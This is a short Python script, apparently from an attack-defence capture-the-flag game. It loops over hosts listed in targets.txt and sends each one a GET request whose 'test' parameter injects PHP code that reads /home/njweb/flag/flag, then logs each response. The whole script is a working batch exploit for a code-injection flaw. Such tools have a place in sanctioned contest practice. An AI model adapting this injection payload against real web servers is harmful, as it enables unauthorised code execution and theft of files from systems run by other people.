import requests
import logging

#l=logging.DEBUG
l=logging.INFO
logging.basicConfig(level=l,format='%(asctime)s %(message)s',datefmt='%a, %d %b %Y %H:%M:%S')

attackurl=[r':20003/index.php?test=echo%20file_get_contents(%27/home/njweb/flag/flag%27);']

targets=[]
#p=r'../getFlag/targets.txt'
p=r'targets.txt'
for line in open(p).readlines():
    targets.append(line.strip())
    logging.debug(line.strip())
for t in targets:
    for u in attackurl:
        r=requests.get('http://'+t+'/'+u)
        logging.info(r.text)
